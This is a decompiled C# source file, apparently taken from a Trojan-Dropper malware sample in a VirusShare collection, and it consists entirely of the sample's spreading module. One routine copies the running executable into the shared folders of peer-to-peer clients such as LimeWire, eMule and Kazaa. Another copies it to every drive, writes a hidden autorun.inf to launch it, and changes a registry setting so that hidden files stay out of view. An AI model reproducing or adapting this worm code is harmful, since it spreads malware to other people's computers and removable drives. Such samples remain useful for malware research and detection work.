// Decompiled with JetBrains decompiler
// Type: hdfghfdghdfghfdgh.spread
// Assembly: fghdfgh, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 59D2BBAC-52A4-41AF-9009-6C20D7F64D35
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Dropper.Win32.Sysn.axbd-19c0d39edbfe66a3ff8170bfe7fc83c000c848bee85291ee0a85269d21b676a2.exe

using hdfghfdghdfghfdgh.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace hdfghfdghdfghfdgh
{
  [StandardModule]
  internal sealed class spread
  {
    public static void p2pSpread(string SpreadDateiName)
    {
      try
      {
        List<string> stringList = new List<string>();
        stringList.Add(Interaction.Environ("programfiles") + "\\LimeWire\\Shared\\");
        stringList.Add(Interaction.Environ("programfiles") + "\\eDonkey2000\\incoming\\");
        stringList.Add(Interaction.Environ("programfiles") + "\\kazaa\\my shared folder\\");
        stringList.Add(Interaction.Environ("programfiles") + "\\kazaa lite\\my shared folder\\");
        stringList.Add(Interaction.Environ("programfiles") + "\\kazaa lite k++\\my shared folder\\");
        stringList.Add(Interaction.Environ("programfiles") + "\\grokster\\my grokster\\");
        stringList.Add(Interaction.Environ("programfiles") + "\\emule\\incoming\\");
        stringList.Add(Interaction.Environ("programfiles") + "\\morpheus\\my shared folder\\");
        stringList.Add(Interaction.Environ("programfiles") + "\\grokster\\my grokster\\");
        stringList.Add(Interaction.Environ("programfiles") + "\\tesla\\files\\");
        stringList.Add(Interaction.Environ("programfiles") + "\\winmx\\shared\\");
        try
        {
          foreach (string str in stringList)
            File.Copy(Application.ExecutablePath, str + SpreadDateiName);
        }
        finally
        {
          List<string>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void usbspread(string spreadname)
    {
      string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
      string[] logicalDrives = Directory.GetLogicalDrives();
      int index = 0;
      while (index < logicalDrives.Length)
      {
        string str = logicalDrives[index];
        try
        {
          File.Copy(Application.ExecutablePath, str + Strings.Trim(spreadname));
          StreamWriter streamWriter = new StreamWriter(str + "\\autorun.inf");
          streamWriter.WriteLine("[autorun]");
          streamWriter.WriteLine("open=" + str + Strings.Trim(spreadname));
          streamWriter.WriteLine("shellexecute=" + str, (object) 1);
          streamWriter.Close();
          File.SetAttributes(str + "autorun.inf", FileAttributes.Hidden);
          File.SetAttributes(str + Strings.Trim(spreadname), FileAttributes.Hidden);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) 0);
    }
  }
}
